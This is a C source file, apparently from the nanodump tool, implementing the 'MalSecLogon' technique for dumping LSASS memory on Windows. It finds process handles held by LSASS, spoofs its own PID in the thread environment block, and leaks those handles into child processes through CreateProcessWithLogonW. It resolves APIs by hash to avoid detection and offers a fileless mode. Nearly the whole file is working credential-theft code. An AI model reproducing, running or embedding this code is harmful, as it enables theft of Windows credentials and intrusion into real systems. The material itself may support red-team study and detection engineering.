#include "malseclogon.h"
#include "handle.h"
#include "dinvoke.h"

#if defined(NANO) && !defined(SSP)

PHANDLE_LIST find_process_handles_in_lsass(
    IN DWORD lsass_pid)
{
    BOOL success;

    DPRINT("Finding handles in the " LSASS " process");

    PHANDLE_LIST handle_list = intAlloc(sizeof(HANDLE_LIST));
    if (!handle_list)
    {
        malloc_failed();
        return NULL;
    }

    ULONG ProcesTypeIndex = 0;
    success = GetTypeIndexByName(&ProcesTypeIndex);
    if (!success)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
    {
        intFree(handle_list); handle_list = NULL;
        return NULL;
    }

    // loop over each handle
    for (ULONG j = 0; j < handleTableInformation->Count; j++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

        // make sure this handle is from LSASS
        if (handleInfo->UniqueProcessId != lsass_pid)
            continue;

        // make sure the handle has the permissions we need
        if ((handleInfo->GrantedAccess & (LSASS_DEFAULT_PERMISSIONS)) != (LSASS_DEFAULT_PERMISSIONS))
            continue;

        // make sure the handle is of type 'Process'
        if (handleInfo->ObjectTypeIndex != ProcesTypeIndex)
            continue;

        if (handle_list->Count + 1 > MAX_HANDLES)
        {
            PRINT_ERR("Too many handles, please increase MAX_HANDLES");
            intFree(handleTableInformation); handleTableInformation = NULL;
            intFree(handle_list); handle_list = NULL;
            return NULL;
        }
        handle_list->Handle[handle_list->Count++] = (HANDLE)(ULONG_PTR)handleInfo->HandleValue;
    }

    intFree(handleTableInformation); handleTableInformation = NULL;
    DPRINT("Found %ld handles in " LSASS, handle_list->Count);
    return handle_list;
}

VOID change_pid(
    IN DWORD new_pid,
    OUT PDWORD previous_pid)
{
    DWORD current_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
    DPRINT(
        "Changing the current PID from %ld to %ld",
        current_pid,
        new_pid);
    if (previous_pid)
        *previous_pid = current_pid;
    PDWORD pPid = (PDWORD)&(((struct TEB*)NtCurrentTeb())->ClientId);
    // the memory region where the TEB is should be RW
    *pPid = new_pid;
}

VOID set_command_line(
    IN BOOL use_malseclogon_locally,
    IN LPWSTR command_line,
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig)
{
    // program path
    wchar_t program_name_w[MAX_PATH];
    mbstowcs(program_name_w, program_name, MAX_PATH);
    wcsncpy(command_line, L"\"", MAX_PATH);
    wcsncat(command_line, program_name_w, MAX_PATH);
    wcsncat(command_line, L"\"", MAX_PATH);
    if (!use_malseclogon_locally)
        return;
    // dump path
    wchar_t dump_path_w[MAX_PATH];
    mbstowcs(dump_path_w, dump_path, MAX_PATH);
    wcsncat(command_line, L" -w ", MAX_PATH);
    wcsncat(command_line, dump_path_w, MAX_PATH);
    // --fork
    if (fork_lsass)
        wcsncat(command_line, L" -f", MAX_PATH);
    // --snapshot
    if (snapshot_lsass)
        wcsncat(command_line, L" -s", MAX_PATH);
    // --valid
    if (use_valid_sig)
        wcsncat(command_line, L" -v", MAX_PATH);
    // malseclogon
    wcsncat(command_line, L" -m", MAX_PATH);
    // --stage 2
    wcsncat(command_line, L" --stage2", MAX_PATH);
}

BOOL save_new_process_pid(
    IN PPROCESS_LIST process_list,
    IN DWORD pid)
{
    if (!process_list)
        return TRUE;

    if (process_list->Count + 1 > MAX_PROCESSES)
    {
        PRINT_ERR("Too many processes, please increase MAX_PROCESSES");
        return FALSE;
    }
    process_list->ProcessId[process_list->Count++] = pid;
    return TRUE;
}

// wait until the process exits and check if the dumpfile exists
BOOL check_if_succeded(
    IN DWORD new_pid,
    IN LPCSTR dump_path)
{
    // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
    HANDLE hSpoofedProcess = get_process_handle(
        new_pid,
        SYNCHRONIZE,
        FALSE);
    if (!hSpoofedProcess)
        return FALSE;

    BOOL success = wait_for_process(hSpoofedProcess);
    if (!success)
        return FALSE;

    NtClose(hSpoofedProcess); hSpoofedProcess = NULL;
    if (!file_exists(dump_path))
        return FALSE;

    return TRUE;
}

VOID kill_created_processes(
    IN PPROCESS_LIST created_processes)
{
    if (!created_processes)
        return;

    DPRINT(
        "Killing the %ld created processes",
        created_processes->Count);
    for (DWORD i = 0; i < created_processes->Count; i++)
    {
        kill_process(
            created_processes->ProcessId[i],
            NULL);
    }
    DPRINT("The created processes have been killed");
}

/*
 * MalSecLogon can be used agains nanodump itself (writing it to disk)
 * or use a another binary (like notepad.exe) and duplicate
 * the leaked handle in order to remain fileless
 */
BOOL MalSecLogon(
    IN LPCSTR binary_path,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST* Pcreated_processes)
{
    PPROCESS_LIST created_processes = NULL;
    BOOL success;

    DPRINT("Using MalSecLogon to get a handle to " LSASS);
    // if MalSecLogon is used to create other processes, save their PID
    if (!use_malseclogon_locally)
    {
        created_processes = intAlloc(sizeof(PROCESS_LIST));
        if (!created_processes)
        {
            *Pcreated_processes = NULL;
            malloc_failed();
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            return FALSE;
        }
    }
    *Pcreated_processes = created_processes;
    // leak an LSASS handle using MalSecLogon
    success = malseclogon_stage_1(
        binary_path,
        dump_path,
        fork_lsass,
        snapshot_lsass,
        use_valid_sig,
        use_malseclogon_locally,
        lsass_pid,
        created_processes);
    if (!success)
    {
        PRINT_ERR("MalSecLogon technique failed!");
        if (created_processes)
        {
            intFree(created_processes); created_processes = NULL;
            *Pcreated_processes = NULL;
        }
        return FALSE;
    }
    if (use_malseclogon_locally)
    {
        // MalSecLogon created a new nanodump process which created the dump
        print_success(
            dump_path,
            use_valid_sig,
            TRUE);
    }
    return TRUE;
}

BOOL malseclogon_stage_1(
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST process_list)
{
    BOOL success;
    PHANDLE_LIST handle_list;

    // if the file already exists, delete it
    if (file_exists(dump_path))
    {
        if (!delete_file(dump_path))
        {
            return FALSE;
        }
    }

    wchar_t command_line[MAX_PATH];
    set_command_line(
        use_malseclogon_locally,
        command_line,
        program_name,
        dump_path,
        fork_lsass,
        snapshot_lsass,
        use_valid_sig);

    handle_list = find_process_handles_in_lsass(
        lsass_pid);
    if (!handle_list)
    {
        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
        return FALSE;
    }

    if (handle_list->Count == 0)
    {
        PRINT_ERR(
            "No handles found in " LSASS ", is the PID %ld correct?.",
            lsass_pid);
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    // change our PID to the LSASS PID
    DWORD original_pid;
    change_pid(lsass_pid, &original_pid);

    PROCESS_INFORMATION procInfo;
    STARTUPINFOW startInfo;
    wchar_t filename[MAX_PATH];
    mbstowcs(filename, program_name, MAX_PATH);

    // find the address of CreateProcessWithLogonW dynamically
    CreateProcessWithLogonW_t CreateProcessWithLogonW;
    CreateProcessWithLogonW = (CreateProcessWithLogonW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CreateProcessWithLogonW_SW2_HASH,
        0);
    if (!CreateProcessWithLogonW)
    {
        DPRINT_ERR("Address of 'CreateProcessWithLogonW' not found");
        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
        intFree(handle_list); handle_list = NULL;
        return FALSE;
    }

    DWORD handles_leaked = 0;
    while (handles_leaked < handle_list->Count)
    {
        memset(&procInfo, 0, sizeof(PROCESS_INFORMATION));
        memset(&startInfo, 0, sizeof(STARTUPINFOW));
        startInfo.dwFlags = STARTF_USESTDHANDLES;

        startInfo.hStdInput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdOutput = handle_list->Handle[handles_leaked++];

        if (handle_list->Count > handles_leaked)
            startInfo.hStdError = handle_list->Handle[handles_leaked++];

        success = CreateProcessWithLogonW(
            NANODUMP_USER,
            NANODUMP_DOMAIN,
            NANODUMP_PASSWD,
            LOGON_NETCREDENTIALS_ONLY,
            filename,
            command_line,
            0,
            NULL,
            NULL,
            &startInfo,
            &procInfo);
        if (!success)
        {
            function_failed("CreateProcessWithLogonW");
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }
        DPRINT(
            "Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from lsass: 0x%lx 0x%lx 0x%lx",
            filename,
            procInfo.dwProcessId,
            (DWORD)(ULONG_PTR)startInfo.hStdInput,
            (DWORD)(ULONG_PTR)startInfo.hStdOutput,
            (DWORD)(ULONG_PTR)startInfo.hStdError);

        // save the PID of the newly created process
        success = save_new_process_pid(process_list, procInfo.dwProcessId);
        if (!success)
        {
            DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
            change_pid(original_pid, NULL);
            intFree(handle_list); handle_list = NULL;
            return FALSE;
        }

        // if MalSecLogon was used against nanodump, check if the minidump was created
        if (use_malseclogon_locally)
        {
            success = check_if_succeded(
                procInfo.dwProcessId,
                dump_path);
            if (success)
            {
                DPRINT(
                    "The dump was succesfully created at %s",
                    dump_path);
                change_pid(original_pid, NULL);
                intFree(handle_list); handle_list = NULL;
                return TRUE;
            }
        }
    }

    // restore the original PID
    change_pid(original_pid, NULL);
    intFree(handle_list); handle_list = NULL;
    if (use_malseclogon_locally)
    {
        // the new nanodump process was unable to create the minidump
        DPRINT_ERR("The created nanodump process did not create the dump");
        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
        return FALSE;
    }
    else
    {
        // all the processes with the leaked handles have been created
        DPRINT(
            "Created %ld processes, trying to duplicate one of the leaked handles to " LSASS,
            process_list->Count);
        return TRUE;
    }
}

#ifdef EXE

HANDLE malseclogon_stage_2(
    IN LPCSTR dump_path)
{
    // if the file already exists, exit
    if (file_exists(dump_path))
        return NULL;

    BOOL found_handle = FALSE;
    HANDLE hProcess = NULL;
    for (DWORD leakedHandle = 4; leakedHandle <= 4 * 6; leakedHandle = leakedHandle + 4)
    {
        if (found_handle || !is_lsass((HANDLE)(ULONG_PTR)leakedHandle))
        {
            NtClose((HANDLE)(ULONG_PTR)leakedHandle);
            continue;
        }
        // found LSASS handle
        hProcess = (HANDLE)(ULONG_PTR)leakedHandle;
        // close all the other handles
        found_handle = TRUE;
    }
    return hProcess;
}
#endif

#endif
